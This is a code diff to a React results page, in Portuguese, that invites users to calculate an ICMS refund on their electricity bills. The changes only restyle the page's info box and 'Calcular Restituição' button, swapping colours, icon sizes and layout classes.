@@ -535,22 +535,22 @@ export default function Resultado() {
                         <h3 className="text-lg font-semibold mb-3 text-[var(--gov-blue-dark)]">
                           Calcule sua Restituição
                         </h3>
-                        <div className="bg-[var(--gov-blue-light)] p-4 rounded-lg border border-[var(--gov-blue-light)]">
+                        <div className="bg-[var(--gov-blue)] p-4 rounded-lg border border-[var(--gov-blue)]">
                           <div className="space-y-4">
                             <div className="flex items-start">
-                              <CircleDollarSign className="h-5 w-5 mt-0.5 mr-2 text-[var(--gov-blue)]" />
+                              <CircleDollarSign className="h-6 w-6 mt-0.5 mr-2 text-white" />
                               <div>
-                                <p className="font-medium">Saiba quanto você tem a receber!</p>
-                                <p className="text-sm text-[var(--gov-gray-dark)]">
+                                <p className="font-medium text-white">Saiba quanto você tem a receber!</p>
+                                <p className="text-sm text-white">
                                   Na próxima etapa, você poderá calcular o valor da sua restituição do ICMS com base nas suas contas de energia elétrica dos últimos 5 anos.
                                 </p>
                               </div>
                             </div>
                             <div className="flex items-start">
-                              <AlertCircle className="h-5 w-5 mt-0.5 mr-2 text-[var(--gov-blue)]" />
+                              <AlertCircle className="h-6 w-6 mt-0.5 mr-2 text-white" />
                               <div>
-                                <p className="font-medium">O que você vai precisar:</p>
-                                <ul className="text-sm text-[var(--gov-gray-dark)] ml-4 list-disc">
+                                <p className="font-medium text-white">O que você vai precisar:</p>
+                                <ul className="text-sm text-white ml-4 list-disc">
                                   <li>Valor médio da sua conta de luz</li>
                                   <li>Período aproximado em que você utiliza esta companhia elétrica</li>
                                 </ul>
@@ -561,9 +561,9 @@ export default function Resultado() {
                       </div>
                       
                       {/* Ações disponíveis */}
-                      <div className="flex justify-center mt-6">
+                      <div className="mt-6">
                         <Button 
-                          className="bg-[var(--gov-yellow)] hover:bg-[var(--gov-yellow)]/90 text-[var(--gov-blue-dark)] font-bold flex items-center justify-center w-full md:w-auto px-10"
+                          className="bg-[var(--gov-yellow)] hover:bg-[var(--gov-yellow)]/90 text-[var(--gov-blue-dark)] font-bold flex items-center justify-center w-full py-3"
                           onClick={prosseguirParaSimulador}
                         >
                           Calcular Restituição
